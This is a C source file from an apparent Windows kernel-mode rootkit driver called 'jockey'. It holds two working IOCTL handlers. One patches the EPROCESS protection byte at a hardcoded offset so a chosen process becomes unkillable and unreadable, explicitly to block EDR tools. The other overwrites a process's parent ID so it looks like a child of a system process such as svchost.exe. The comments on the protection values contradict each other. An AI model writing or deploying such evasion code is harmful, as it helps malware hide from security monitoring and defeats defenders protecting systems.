#include "jockey_common.h"

/*
 * jockey_proc.c ??? Process shield and process-level operations.
 *
 * Sets process protection level to make it unkillable/unreadable
 * by non-protected processes. Modifies EPROCESS->Protection field.
 */

#include "jockey.h"

/*
 * jockey_ioctl_process_shield:
 *   Sets PsProtection on target process.
 *   Level 0x72 = PsProtectedSignerWinTcm, level 2 (high).
 *   Prevents EDR from reading memory or terminating.
 */
NTSTATUS jockey_ioctl_process_shield(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_shield req;
    NTSTATUS status;
    PEPROCESS target;
    uint32_t *out;

    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    status = PsLookupProcessByProcessId((HANDLE)(uintptr_t)req.pid, &target);
    if (!NT_SUCCESS(status))
        return status;

    /*
     * PsProtection is a union in EPROCESS:
     *   UCHAR Level;
     *   struct {
     *       UCHAR Type   : 3;   // 0=none, 1=protected, 2=light
     *       UCHAR Audit  : 1;
     *       UCHAR Signer : 4;   // 0=Unprotected, 1=Authenticode, etc.
     *   };
     *
     * 0x72 = Type=2 (PsProtectedSignerWinTcm), Signer=7 (PsProtectedSignerMax)
     */
    {
        UCHAR *prot = (UCHAR *)target + 0x6FA; /* offset varies by build */
        if (req.level == 0)
            *prot = 0x00; /* Unprotected */
        else
            *prot = (UCHAR)(req.level & 0xFF);
    }

    ObDereferenceObject(target);

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);

    DbgPrint("[jockey] Shield PID %u (level=0x%X)\n", req.pid, req.level);
    return STATUS_SUCCESS;
}

/*
 * jockey_ioctl_spoof_ppid:
 *   Modifies EPROCESS->InheritedFromUniqueProcessId.
 *   Makes process appear as child of another (e.g., svchost.exe).
 */
NTSTATUS jockey_ioctl_spoof_ppid(PIRP irp, ULONG in_len, ULONG out_len)
{
    struct jky_req_ppid req;
    NTSTATUS status;
    PEPROCESS child, parent;
    uint32_t *out;

    UNREFERENCED_PARAMETER(out_len);

    if (in_len < sizeof(req))
        return STATUS_INVALID_PARAMETER;

    RtlCopyMemory(&req, irp->AssociatedIrp.SystemBuffer, sizeof(req));

    status = PsLookupProcessByProcessId((HANDLE)(uintptr_t)req.child_pid, &child);
    if (!NT_SUCCESS(status))
        return status;

    status = PsLookupProcessByProcessId((HANDLE)(uintptr_t)req.new_ppid, &parent);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(child);
        return status;
    }

    /* Overwrite InheritedFromUniqueProcessId in EPROCESS */
    {
        HANDLE *ppid_ptr = (HANDLE *)((uint8_t *)child + 0x540); /* offset varies */
        *ppid_ptr = PsGetProcessId(parent);
    }

    ObDereferenceObject(child);
    ObDereferenceObject(parent);

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);

    DbgPrint("[jockey] Spoofed PPID: %u -> %u\n",
             req.child_pid, req.new_ppid);
    return STATUS_SUCCESS;
}

